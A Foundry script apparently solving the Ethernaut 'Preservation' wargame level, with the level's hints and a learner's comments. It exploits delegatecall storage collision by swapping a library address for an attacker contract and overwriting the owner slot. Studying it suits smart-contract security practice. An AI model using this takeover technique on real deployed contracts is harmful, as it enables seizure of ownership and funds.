/*
This contract utilizes a library to store two different times for two different timezones. 
The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. 
libraries, and what implications it has on execution scope.
Understanding what it means for delegatecall to be context-preserving.
Understanding how storage variables are stored and accessed.
Understanding how casting works between different data types.


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "src/Preservation.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    address public attacker;

    constructor() {
        attacker = msg.sender;
    }

    function setTime(uint256 _time) public {
        owner = 0x58AC4330c91A5d7fDba80Bc439D70Ef0CbDA6072; // your address
    }
}

contract PreservationSolution is Script {
    Preservation public preservation = Preservation(0x65995cf3C086EE073DB20eAf3eE47EfD04D393D1);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // only user input is _timeStamp, that's the only field we can control
        // 1. can we change the librarys addresses to our contract addresses to change the owner value with delegatecall?
        // abi.encodePacked might be risky
        // i think it's related to the fact that storedTime slot is 0, and timezone1Library address is 0 and it writes to the same slot?
        // gonna deep dive in delegatecall about writing to storage
        // yes its exactly like i described
        // to solve the issue, you can copy all variables to library contract so they will be same slot
        console.log("firsttime:", preservation.timeZone1Library());
        console.log("secondtime:", preservation.timeZone2Library());
        console.log("owner:", preservation.owner());
        Attack attack = new Attack();
        console.log("attacker address:", address(attack));
        preservation.setFirstTime(uint160(address(attack)));
        preservation.setFirstTime(uint160(vm.envAddress("MY_ADDRESS")));
        console.log("firsttime after set:", preservation.timeZone1Library());
        console.log("secondtime after set:", preservation.timeZone2Library());
        console.log("owner after set:", preservation.owner());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
